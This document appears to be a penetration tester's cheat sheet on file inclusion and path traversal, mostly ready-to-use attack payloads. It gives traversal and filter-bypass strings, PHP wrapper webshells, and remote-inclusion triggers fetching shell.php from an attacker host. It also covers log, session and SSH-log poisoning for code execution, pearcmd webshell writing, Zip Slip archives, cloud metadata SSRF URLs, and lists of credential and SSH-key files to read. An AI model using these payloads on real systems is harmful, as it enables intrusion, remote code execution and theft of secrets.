# File Inclusion

#LFI #RFI #FileInclusion #RemoteFileInclusion #LocalFileInclusion #PathTraversal

## What is this?

Web app dynamically includes files based on user input. LFI = local files, RFI = remote files (needs `allow_url_include=On`). Path traversal with `../../../` to read arbitrary files, potential RCE via log poisoning, file uploads, or PHP wrappers.

**Vulnerable code:** `include($_GET['page'] . '.php');`

**Resource:** [Barb'hack 2022: PHP LFI to RCE](https://www.riskinsight-wavestone.com/en/2022/09/barbhack-2022-leveraging-php-local-file-inclusion-to-achieve-universal-rce/)

---

## LFI Attack Types

### Basic LFI - Absolute Paths

```bash
# Linux
?file=/etc/passwd
?file=/var/log/apache2/access.log
?file=/proc/self/environ

# Windows  
?file=C:\Windows\boot.ini
?file=C:\Windows\System32\drivers\etc\hosts
?file=C:\inetpub\wwwroot\web.config
```

### Path Traversal - Relative Paths

```bash
?file=../../../etc/passwd
?file=..\..\..\..\windows\win.ini
?file=....//....//....//etc/passwd
```

### Filename Prefix/Append Bypass

App prepends/appends strings: `include('lang/' . $_GET['file'] . '.php')`

```bash
?file=../../../etc/passwd%00           # Null byte (legacy PHP < 5.3)
?file=../../../etc/passwd/./././[...]  # Path truncation (2048+ chars)
```

### Second-Order LFI

Inject payload into DB/log → trigger inclusion later
- Upload filename: `../../etc/passwd`
- User profile: `<?php system('id'); ?>`

---

## Filter Bypasses

### Non-Recursive Filters

Strips `../` once:

```bash
?file=....//....//....//etc/passwd       # Double slashes
?file=..././..././..././etc/passwd       # Mixed
?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd    # URL encode
?file=%252e%252e%252f%252e%252e%252f     # Double encode
```

### Windows Backslash Encoding

Windows accepts both `/` and `\` as path separators. Filters often only check forward slashes.

```bash
# Backslash traversal
?file=..\..\..\..\windows\win.ini

# URL-encoded backslash (%5c)
?file=..%5c..%5c..%5c..%5cwindows%5cwin.ini

# Double-encoded backslash (%255c)
?file=..%255c..%255c..%255c..%255cwindows%5cwin.ini

# Mix forward and backslashes to confuse filters
?file=../..\..\../windows/win.ini
?file=..%5c..%2f..%5c..%2fwindows%5cwin.ini
```

### Approved Path Bypass

Start with approved path then traverse:

```bash
?file=./images/../../../../../etc/passwd
?file=/var/www/html/../../../etc/passwd
```

### Extension Appending Bypass

```bash
# Null byte (PHP < 5.3.4)
?file=../../../etc/passwd%00
?file=../../../etc/passwd%00.jpg

# Path truncation (max path length)
?file=../../../etc/passwd/./././././[REPEAT 2048 TIMES]
```

### Real HTB Examples

```bash
# Basic traversal
?language=languages/../../../../../flag.txt

# URL encoded
?language=languages%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fflag.txt

# Approved path bypass
?language=./languages/../../../../../flag.txt

# Double encoded
?language=%25%32%65%25%32%65%25%32%66flag.txt

# Mixed slashes
?language=..//..//..//..//flag.txt

# Null byte + extension
?language=./languages/../../flag.txt%00.php
```

---

## PHP Wrappers & Filters

### php://filter - Read Source

Viewing PHP executes it. Use filters to read as base64.

```bash
# Read config.php as base64
?file=php://filter/read=convert.base64-encode/resource=config

# Real example
?language=php://filter/read=convert.base64-encode/resource=configure

# Grab php.ini
curl "http://target.com/?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"

# Decode
echo "BASE64_OUTPUT" | base64 -d
```

**Docs:**  
- [PHP Filters](https://www.php.net/manual/en/filters.php)
- [String Filters](https://www.php.net/manual/en/filters.string.php)
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)

### data:// - Inject Code

Requires `allow_url_include=On`

```bash
# Basic
?file=data://text/plain,<?php phpinfo(); ?>

# Base64 encoded
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+

# Webshell
curl -s 'http://target.com/?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id'

# Create payload
echo '<?php system($_GET["cmd"]); ?>' | base64
```

### php://input - POST Payloads

Requires `allow_url_include=On`

```bash
# Send payload via POST
curl -X POST -d '<?php system($_GET["cmd"]); ?>' 'http://target.com/?language=php://input&cmd=id'

# Alternative
curl -s -X POST --data '<?php system("whoami"); ?>' 'http://target.com/?file=php://input'
```

### expect:// - Direct Commands

Rarely available, needs manual install

```bash
?file=expect://id
?file=expect://whoami

# Check if enabled
curl "http://target.com/?file=php://filter/read=convert.base64-encode/resource=/etc/php/php.ini" | base64 -d | grep expect
```

### zip:// - Execute from Zips

```bash
# Create malicious zip
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.jpg shell.php

# Upload then include
?file=zip://uploads/shell.jpg%23shell.php&cmd=id

# Full path often needed
?file=zip:///var/www/html/uploads/shell.jpg%23shell.php&cmd=whoami
```

### phar:// - PHP Archives

```bash
# Create phar (shell.php)
cat > shell.php << 'EOF'
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
?>
EOF

# Compile and rename
php --define phar.readonly=0 shell.php
mv shell.phar shell.jpg

# Include
?file=phar://uploads/shell.jpg/shell.txt&cmd=id
```

---

## Remote File Inclusion (RFI)

Requires `allow_url_include=On` (disabled by default on modern PHP)

### Testing

```bash
# Local loopback (safer)
?file=http://127.0.0.1/index.php

# External test
?file=http://yourserver.com/test.txt

# Google test (usually blocked)
?file=http://google.com
```

### Basic RFI Shell

```bash
# On your server (shell.php)
<?php system($_GET['cmd']); ?>

# Start server
python3 -m http.server 80

# Trigger
http://target.com/?language=http://ATTACKER_IP/shell.php&cmd=id
```

### SMB-Based RFI (Windows)

```bash
# Start SMB server
impacket-smbserver -smb2support share $(pwd)

# UNC path inclusion
?file=\\ATTACKER_IP\share\shell.php&cmd=whoami
?file=//ATTACKER_IP/share/shell.php&cmd=whoami
```

### RFI Limitations

- Most modern servers disable `allow_url_include`
- Firewalls often block outbound HTTP
- WAFs detect external URLs
- When it works = instant RCE

---

## LFI + File Upload = RCE

Upload malicious file → Include with LFI → Code execution

### Image Files

```bash
# GIF magic bytes + payload
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif

# Upload then include
?file=./uploads/profile_images/shell.gif&cmd=id
```

### ZIP Upload

```bash
# Create webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.jpg shell.php

# Upload as "image" then include
?file=zip://./uploads/shell.jpg%23shell.php&cmd=whoami
```

### PHAR Upload

```bash
# See phar:// section above for creation
# Upload phar as .jpg/.png
?file=phar://./uploads/avatar.jpg/shell.txt&cmd=id
```

### Polyglot Files

```bash
# Valid image + PHP
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg

# Or append
echo '<?php system($_GET["cmd"]); ?>' >> legit_image.jpg

# Include
?file=./uploads/image.jpg&cmd=id
```

---

## Log Poisoning

Inject PHP into logs → Include log → Code execution

### Apache/Nginx Logs

**Locations:**

```bash
# Linux
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log

# Windows
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
```

**Attack:**

```bash
# 1. Read log
?file=../../../../var/log/apache2/access.log

# 2. Poison via User-Agent
curl -A '<?php system($_GET["cmd"]); ?>' http://target.com/

# 3. Include and execute
?file=../../../../var/log/apache2/access.log&cmd=id
```

**Other injection points:**

```bash
# Referer
curl -H 'Referer: <?php system("id"); ?>' http://target.com/

# Cookie
curl -H 'Cookie: <?php system("whoami"); ?>' http://target.com/
```

### PHP Sessions

**Locations:**

```bash
/var/lib/php/sessions/sess_[PHPSESSID]
/var/lib/php5/sessions/sess_[PHPSESSID]
C:\Windows\Temp\sess_[PHPSESSID]
```

**Attack:**

```bash
# 1. Get session ID
PHPSESSID=nhhv8i0o6ua4g88bkdl9u1fdsd

# 2. Poison session data
?name=<?php system($_GET["cmd"]); ?>

# 3. Include
?file=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

### IIS Logs (Windows)

**Locations:**

```bash
C:\inetpub\logs\LogFiles\W3SVC1\       # Default IIS log dir
C:\Windows\System32\LogFiles\W3SVC1\    # Alternate path
# Log files named by date: ex[YYMMDD].log (e.g., ex250223.log)
# Check current date for the right file
```

**Attack:**

```bash
# 1. Read IIS log (need to guess/know the date-based filename)
?file=C:\inetpub\logs\LogFiles\W3SVC1\ex250223.log

# 2. Poison via User-Agent (same technique as Apache)
curl -A '<?php system($_GET["cmd"]); ?>' http://target.com/

# 3. Include and execute
?file=C:\inetpub\logs\LogFiles\W3SVC1\ex250223.log&cmd=whoami
```

**Note:** IIS logs use W3C format by default, which logs User-Agent, URI, and query strings. All are injection points.

### /proc/self/fd/ Poisoning

When log files aren't world-readable, open file descriptors in `/proc/self/fd/` sometimes are. Apache/Nginx hold FDs to their own logs.

```bash
# 1. Poison via User-Agent (same as Apache log poisoning)
curl -A '<?php system($_GET["cmd"]); ?>' http://target.com/

# 2. Brute-force the file descriptor number (typically 1-20)
for i in $(seq 1 25); do
    curl -s "http://target.com/?file=/proc/self/fd/$i&cmd=id" | grep -v "failed"
done

# Or fuzz with ffuf
ffuf -w <(seq 1 25) -u 'http://target.com/?file=/proc/self/fd/FUZZ&cmd=id' -fw 1
```

### SSH Logs

```bash
# Locations
/var/log/auth.log       # Debian/Ubuntu
/var/log/secure         # RedHat/CentOS

# Poison via username
ssh '<?php system($_GET["cmd"]); ?>'@target.com

# Include
?file=/var/log/auth.log&cmd=whoami
```

### Mail Logs

```bash
# Locations
/var/log/mail.log       # Linux

# Poison via SMTP (send email with PHP payload in subject/body)
# Less common but worth trying if other logs aren't readable

# Windows (if SMTP is installed)
C:\inetpub\mailroot\Pickup\
```

---

## phpinfo() + LFI Race Condition (Insomnia Technique)

If `phpinfo()` is exposed, it leaks the temp path of uploaded files before PHP deletes them. Race the LFI to include the temp file → RCE without `allow_url_include`.

**Requirements:** LFI vuln + `phpinfo()` accessible (e.g. `?file=phpinfo.php` or direct URL)

```bash
# 1. Check if phpinfo leaks upload_tmp_dir and temp file on upload
curl -s http://target.com/phpinfo.php | grep -i "upload_tmp_dir\|_FILES"

# 2. Use the phpinfo LFI race PoC
# Download: https://github.com/roughiz/lfito_rce
python lfito_rce.py -l "http://target.com/?file=" -p "http://target.com/phpinfo.php"

# Manual approach — send multipart upload + LFI simultaneously in a loop
# phpinfo() shows the temp filename (e.g. /tmp/phpXXXXXX) in the upload section
# Race condition: include /tmp/phpXXXXXX before PHP's cleanup runs
```

**Why it works:** PHP writes uploaded files to `/tmp/phpXXXXXX`, executes the request, then deletes the temp file. `phpinfo()` echoes `$_FILES` including the temp path — race the LFI against the same request window.

---

## pearcmd.php LFI → RCE (PHP Docker / pecl installs)

`pearcmd.php` ships with PHP in Docker images and some default installs. If reachable via LFI, you can abuse its `--install-dir` parameter to write a webshell.

```bash
# Check if pearcmd.php is reachable
?file=/usr/local/lib/php/pearcmd.php

# Trigger via query string — write webshell to web root
?file=/usr/local/lib/php/pearcmd.php&+install-dir=/var/www/html&+install-plugins-dir=/var/www/html&+install-headers-dir=/var/www/html&+channel=http://<AttackerIP>/shell.xml&+install

# Simpler — use the config-create command to write arbitrary content
?file=/usr/local/lib/php/pearcmd.php&+config-create+/&/<?php+system($_GET["cmd"]);?>+/var/www/html/shell.php

# Then execute
curl "http://target.com/shell.php?cmd=id"
```

**Common in:** PHP Docker containers (php:7/8-apache, php-fpm images), some HTB machines where `/usr/local/lib/php/pearcmd.php` exists.

---

## Automated Scanning

### Fuzz for Parameters

```bash
# Find vulnerable params
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
     -u 'http://target.com/?FUZZ=value' \
     -fs 2287

# Common params to try
?file= ?page= ?lang= ?language= ?dir= ?path= ?module= ?include= ?doc= ?template=
```

### Fuzz for LFI Payloads

```bash
# LFI wordlist
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
     -u 'http://target.com/?language=FUZZ' \
     -fs 2287 -mc 200
```

**Wordlists:**  
- [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)
- [HackTricks File Inclusion](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/)

### Find Web Root

```bash
# Linux webroots
ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
     -u 'http://target.com/?file=../../../../FUZZ/index.php' \
     -fs 2287

# Manual check
curl http://target.com/?file=../../../../etc/apache2/apache2.conf
curl http://target.com/?file=../../../../var/www/html/index.php
```

**Wordlists:**  
- [Linux Webroots](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)
- [Windows Webroots](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)

### Tools

- [[liffy]] - LFI exploitation
- [[LFI Freak]] - Automated scanner  
- [[LFI Suite]] - Enumeration and exploitation
- [[ffuf]] - Fast fuzzer
- [[gobuster]] - Directory bruteforcer

---

## High-Value Targets

### Linux

```bash
# Passwords & Users
/etc/passwd
/etc/shadow              # Need root
/root/.bash_history
/home/[user]/.bash_history

# Web Configs
/var/www/html/config.php
/var/www/html/.env       # Laravel/Node secrets
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf

# System Info
/proc/self/environ       # Env variables
/proc/self/cmdline       # Current process
/proc/version            # Kernel
/etc/issue               # OS version
/etc/hostname

# Logs
/var/log/apache2/access.log
/var/log/auth.log
/var/log/syslog

# SSH Keys
/root/.ssh/id_rsa
/home/[user]/.ssh/id_rsa
/home/[user]/.ssh/authorized_keys

# DB Creds
/etc/mysql/my.cnf
/etc/my.cnf

# Cron
/etc/crontab
/var/spool/cron/crontabs/root

# Proc Filesystem
/proc/self/environ
/proc/self/cmdline
/proc/self/cwd/index.php
/proc/self/fd/[0-9]
```

### Windows

```bash
# System
C:\Windows\System32\drivers\etc\hosts
C:\Windows\boot.ini
C:\Windows\win.ini
C:\Windows\System32\license.rtl
C:\Windows\debug\NetSetup.LOG           # Domain join info

# Credentials & Secrets
C:\Windows\Panther\Unattend.xml          # Automated install creds (b64 passwords)
C:\Windows\Panther\unattend\Unattend.xml
C:\Windows\System32\config\SAM           # Local password hashes (need SYSTEM)
C:\Windows\repair\SAM                    # Backup SAM (older systems)
C:\Windows\repair\system
C:\Windows\System32\config\RegBack\SAM   # Registry backup

# IIS Configs
C:\Windows\System32\inetsrv\config\applicationHost.config  # Full IIS config
C:\inetpub\wwwroot\web.config           # App config, connection strings
C:\inetpub\wwwroot\global.asax

# PHP/Web Configs
C:\xampp\apache\conf\httpd.conf
C:\xampp\php\php.ini
C:\xampp\mysql\bin\my.ini
C:\wamp\apache2\conf\httpd.conf
C:\php\php.ini
C:\Windows\php.ini

# Logs
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\inetpub\logs\LogFiles\W3SVC1\        # IIS logs (ex*.log files)
C:\Windows\System32\LogFiles\W3SVC1\     # Alternate IIS log path
C:\Windows\System32\winevt\Logs\

# User Data
C:\Users\[user]\.ssh\id_rsa             # SSH keys on Windows
C:\Users\[user]\.ssh\authorized_keys
C:\Users\[user]\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt  # PowerShell history (goldmine)
C:\Users\[user]\AppData\Local\
C:\Users\[user]\Desktop\
C:\Users\[user]\.gitconfig               # Git config, possible creds
```

---

## Non-PHP Environments

> For full exploitation chains (SSTI, deserialization, Werkzeug PIN, ViewState, etc.) see [[Non-PHP Web App Attacks]]

### Key Difference

In non-PHP stacks, file inclusion bugs are **path traversal → arbitrary file read**. No wrappers, no log poisoning to RCE. This section covers traversal payloads and what to target. RCE escalation is in the note above.

**Attack flow:** Path traversal → read source/config → chain with SSTI/deserialization/secrets

---

### Nginx Alias Traversal (server-level, any stack)

Misconfigured `alias` without trailing slash on the `location` block:

```nginx
# Vulnerable config
location /static {
    alias /var/www/files/;   # note: no trailing slash on /static
}
```

```bash
# Traverse out of the alias root
curl http://target.com/static../etc/passwd
curl http://target.com/static../app/.env
curl http://target.com/static../.env
```

---

### NodeJS / Express

Vulnerable patterns:

```javascript
// res.sendFile with user-controlled path
app.get('/file', (req, res) => res.sendFile(req.query.name, {root: '/var/www/'}))

// path.join doesn't block ../../
const filePath = path.join(__dirname, req.query.file)
fs.readFile(filePath, ...)
```

```bash
# Basic traversal
curl 'http://target.com/file?name=../../../../etc/passwd'

# URL encoded
curl 'http://target.com/file?name=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'

# Double encoded
curl 'http://target.com/file?name=%252e%252e%252f%252e%252e%252fetc%252fpasswd'
```

High-value targets:

```bash
/proc/self/environ          # Env vars — may leak secrets, DB URLs
/app/.env                   # SECRET_KEY, DB creds, API keys
/app/config.js              # App config
/app/package.json           # Dependencies — look for known-vuln versions
/app/routes/index.js        # Source code — find more vulns
```

RCE path: read source → find `eval()`, template engine (`ejs`, `pug`, `handlebars`), or dangerously-used `child_process` → SSTI/injection → RCE.

---

### Python / Flask / Django

Vulnerable patterns:

```python
# Flask — send_file with user input
return send_file(request.args.get('file'))

# open() with user-controlled path
with open(f"files/{request.args.get('name')}") as f: ...
```

```bash
# Basic traversal
curl 'http://target.com/download?file=../../../../etc/passwd'
curl 'http://target.com/download?file=....//....//....//etc/passwd'
```

High-value targets:

```bash
/app/app.py                 # Main Flask app — find routes, secrets, template sinks
/app/config.py              # SECRET_KEY, DB URI
/app/.env                   # Env secrets
/proc/self/environ          # Runtime environment
/app/requirements.txt       # Dependency versions
```

**Werkzeug debugger (Flask `debug=True`):** If active, read `/etc/machine-id` + `/proc/self/cwd/app.py` via LFI → calculate PIN → RCE. Full PIN calculation in [[Non-PHP Web App Attacks]].

---

### Java / Spring Boot

Vulnerable patterns:

```java
// Servlet file download
String file = request.getParameter("file");
InputStream is = new FileInputStream("/var/data/" + file);
```

```bash
# Path traversal
curl 'http://target.com/download?file=../../WEB-INF/web.xml'
curl 'http://target.com/download?file=../../WEB-INF/classes/com/example/Config.class'

# URL encoded
curl 'http://target.com/download?file=..%2F..%2FWEB-INF%2Fweb.xml'
```

High-value targets:

```bash
WEB-INF/web.xml                                 # Servlet mappings, auth config
WEB-INF/applicationContext.xml                  # Spring beans, DB creds
WEB-INF/classes/application.properties          # Spring Boot config
WEB-INF/classes/application.yml                 # Same, YAML format
META-INF/MANIFEST.MF                            # App metadata
/etc/passwd
```

**Spring Boot Actuator** (exposed at `/actuator`): dump `/env`, `/heapdump`, `/mappings`. Full actuator abuse + RCE chains in [[Non-PHP Web App Attacks]].

---

### ASP.NET / IIS

Vulnerable patterns:

```csharp
// Response.WriteFile with user input
Response.WriteFile(Server.MapPath(Request.QueryString["file"]));
```

```bash
# Path traversal
curl 'http://target.com/download?file=../../../../windows/win.ini'
curl 'http://target.com/download?file=../../../../inetpub/wwwroot/web.config'

# URL encoded
curl 'http://target.com/download?file=%2e%2e%2f%2e%2e%2fweb.config'

# IIS Unicode encoding (legacy)
curl 'http://target.com/download?file=..%c0%af..%c0%afweb.config'
```

High-value targets:

```bash
web.config                  # DB connection strings, app settings, machine key
appsettings.json            # .NET Core secrets
appsettings.Development.json
bin/<App>.dll               # Compiled assembly — decompile with dotPeek/ILSpy
global.asax
```

**IIS short filename (8.3) enumeration:**

```bash
# Tilde enumeration to reveal hidden files/directories
curl "http://target.com/~1/" -v     # Check for IIS short name vuln
# Tool: IIS-ShortName-Scanner
java -jar iis_shortname_scanner.jar 2 20 http://target.com/
```

**RCE path:** `web.config` → `machineKey` → ViewState deserialization (`ysoserial.net`). Full chain in [[Non-PHP Web App Attacks]].

---

### Ruby on Rails

```bash
# send_file path traversal
curl 'http://target.com/download?file=../../../../etc/passwd'

# render file: traversal (old Rails)
curl 'http://target.com/page?template=../../etc/passwd'

# Encoded
curl 'http://target.com/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd'
```

High-value targets:

```bash
config/database.yml         # DB creds
config/secrets.yml          # Secret key base
.env                        # Environment secrets
config/master.key           # Rails credentials decryption key
```

---

### Zip Slip (any language)

Malicious ZIP with path-traversal filenames — extracts files to arbitrary locations on the server.

```bash
# Create malicious zip (Python)
python3 -c "
import zipfile
with zipfile.ZipFile('evil.zip', 'w') as z:
    z.write('/etc/passwd', '../../evil_shell.php')
"

# Or use evilarc
python evilarc.py shell.php -o evil.zip -p '../../../var/www/html/' -d 5

# Upload and trigger extraction — if app extracts to web root, shell is accessible
```

---

### Non-PHP: File Read → RCE Summary

Full exploitation detail for each path in [[Non-PHP Web App Attacks]].

| Finding | RCE Path |
|---------|----------|
| `.env` / `SECRET_KEY` | Flask SSTI, JWT forgery, auth bypass |
| `web.config` machineKey | ViewState deserialization (ysoserial.net) |
| Source code with template engine | SSTI (Jinja2, Freemarker, Thymeleaf, Pebble, ERB) |
| `id_rsa` / SSH key | SSH access → shell |
| DB creds | Direct DB query → write webshell (if MySQL) |
| Spring Actuator `/heapdump` | Extract creds from memory |
| Werkzeug debug PIN inputs | Calculate PIN → debugger RCE |

---

## Language-Specific Functions

### PHP

| Function | Read | Execute | Remote |
|----------|:----:|:-------:|:------:|
| `include()` / `include_once()` | ✅ | ✅ | ✅ |
| `require()` / `require_once()` | ✅ | ✅ | ❌ |
| `file_get_contents()` | ✅ | ❌ | ✅ |
| `fopen()` / `file()` | ✅ | ❌ | ❌ |

### NodeJS

| Function | Read | Execute | Remote |
|----------|:----:|:-------:|:------:|
| `fs.readFile()` | ✅ | ❌ | ❌ |
| `fs.sendFile()` | ✅ | ❌ | ❌ |
| `res.render()` | ✅ | ✅ | ❌ |

### Java

| Function | Read | Execute | Remote |
|----------|:----:|:-------:|:------:|
| `include` | ✅ | ❌ | ❌ |
| `import` | ✅ | ✅ | ✅ |

### .NET

| Function | Read | Execute | Remote |
|----------|:----:|:-------:|:------:|
| `@Html.Partial()` | ✅ | ❌ | ❌ |
| `@Html.RemotePartial()` | ✅ | ❌ | ✅ |
| `Response.WriteFile()` | ✅ | ❌ | ❌ |
| `include` | ✅ | ✅ | ✅ |

---

## Troubleshooting

### Not Working?

**Getting 403/blocked:**
- Try different encodings (single, double, triple)
- Mix encoding types (URL + unicode)
- Use approved paths as prefix
- Check for WAF (look for generic error pages)

**PHP version matters:**
- Null bytes only work on PHP < 5.3.4
- Path truncation mainly legacy systems
- Modern PHP has better filtering

**RFI failing:**
- Check `allow_url_include` in php.ini
- Try HTTP vs HTTPS
- Firewall blocking outbound?
- Use SMB instead (Windows)

**Log poisoning not working:**
- Log file permissions (might not be readable)
- Log rotation (file changed since poison)
- Special chars getting escaped/filtered
- Try different headers (User-Agent, Referer, Cookie)

**Can't find web root:**
- Check error messages for path disclosure
- Try common paths: `/var/www/html`, `/var/www`, `/usr/local/www`
- Fuzz with weblists
- Look at HTTP headers (Server, X-Powered-By)

**Wrappers not available:**
- `allow_url_include` disabled (common)
- `expect://` needs manual install (rare)
- Some wrappers disabled in php.ini
- Check phpinfo() if you can access it

### LFI to SSRF

Some LFI vulns can pivot into Server-Side Request Forgery when the underlying function supports URLs.

**When it works:**
- `file_get_contents()`, `include()` with `allow_url_include=On`, or similar functions that resolve URLs
- App processes the fetched content server-side (not just displaying it)

**Recon via /proc (Linux):**

```bash
# Map internal network
?file=../../../proc/net/tcp          # Active TCP connections (hex-encoded IPs/ports)
?file=../../../proc/net/arp          # ARP table - find other hosts on the network
?file=../../../proc/self/environ     # Environment vars - may leak internal URLs/IPs
?file=../../../etc/hosts             # Local DNS - internal hostnames
```

**Recon (Windows):**

```bash
# Windows doesn't have /proc but you can still gather intel
?file=C:\Windows\System32\drivers\etc\hosts          # Internal hostnames
?file=C:\Windows\System32\drivers\etc\networks        # Network definitions
?file=C:\inetpub\wwwroot\web.config                   # Connection strings with internal IPs
?file=C:\Windows\System32\inetsrv\config\applicationHost.config  # IIS bindings, internal sites
```

**Pivot to internal services:**

```bash
# Hit internal services the server can reach but you can't
?file=http://127.0.0.1:8080/admin
?file=http://127.0.0.1:6379/        # Redis
?file=http://internal-api.local/v1/users
?file=http://localhost:3000/internal/debug
?file=http://10.0.0.1:9200/_cluster/health  # Elasticsearch

# Cloud metadata endpoints (if target is cloud-hosted)
?file=http://169.254.169.254/latest/meta-data/              # AWS
?file=http://169.254.169.254/metadata/instance?api-version=2021-02-01  # Azure (needs Metadata:true header - may not work via LFI)
?file=http://169.254.169.254/computeMetadata/v1/            # GCP (needs Metadata-Flavor:Google header)
```

**Note:** Azure and GCP metadata require custom headers, so LFI-based SSRF usually only works cleanly against AWS. If you have `file_get_contents()` with controllable headers or a full SSRF, Azure/GCP become viable.

**Decode /proc/net/tcp:**

```bash
# Format: local_address remote_address st
# 0100007F:1F90 = 127.0.0.1:8080
# Convert hex to decimal for ports, hex pairs (reversed) for IPs
cat /proc/net/tcp | awk '{print $2}' | grep -v local
```

### Escalation Paths

1. LFI → Source Code → Find creds/bugs
2. LFI → Log Poisoning → RCE
3. LFI + Upload → RCE
4. LFI → /proc/self/environ → Poison → RCE
5. LFI → SSH Keys → Lateral movement
6. RFI → Reverse Shell → Full system
7. LFI → SSRF → Internal services / Cloud metadata

---

## Related Topics

**Modules:**
- [[File Upload Attacks]] - Combine with LFI for RCE
- [[Web Attacks]] - XXE and other injections
- [[Command Injection]] - Alternative RCE
- [[Attacking Common Services]] - SMB for RFI

**Tools:**
- [[ffuf]] - Fuzzing
- [[gobuster]] - Enumeration
- [[Burp Suite]] - Manual testing

**External:**
- [HackTricks - File Inclusion](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/)
- [PayloadsAllTheThings - LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [OWASP - Testing for LFI](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)

